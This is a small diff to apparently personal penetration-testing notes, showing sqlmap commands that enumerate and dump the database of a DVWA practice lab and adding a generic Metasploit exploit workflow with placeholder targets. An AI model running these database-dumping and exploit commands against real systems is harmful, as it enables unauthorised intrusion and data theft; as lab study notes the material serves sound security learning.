@@ -93,6 +93,14 @@ Sqlmap -r req.txt -D dvwa --table
 Sqlmap -r req.txt -D dvwa --tables –columns 
 Sqlmap -r req.txt -D dvwa --dump 
 
+##### Metasploit
+msfconsole
+search name
+use exploit/unix/webapp/
+set RHOSTS ip
+set RPORT port
+run
+#######
 
 In alternative we can use SQLMap and the vulnerable url
 
